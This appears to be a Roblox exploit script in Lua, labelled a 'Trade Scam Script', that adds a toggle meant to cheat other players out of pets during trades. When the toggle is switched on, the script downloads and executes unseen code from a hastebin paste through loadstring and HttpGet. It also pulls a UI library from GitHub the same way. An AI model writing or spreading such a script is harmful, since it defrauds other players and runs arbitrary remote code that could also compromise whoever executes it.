local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Trade Scam Script By Kim Joseph", "LightTheme")

--Trade
local Trade = Window:NewTab("Trade")
local ScamSection = Trade:NewSection("Scam")


ScamSection:NewToggle("Trade Scam", "Put Pet a Trade and on this", function(state)
    if state then
_G.Key = 538057555
loadstring(game:HttpGet("https://hastebin.app/raw/626c2b78d3810c001cf24b08"))()
    else
        print("Toggle Off")
    end
end)
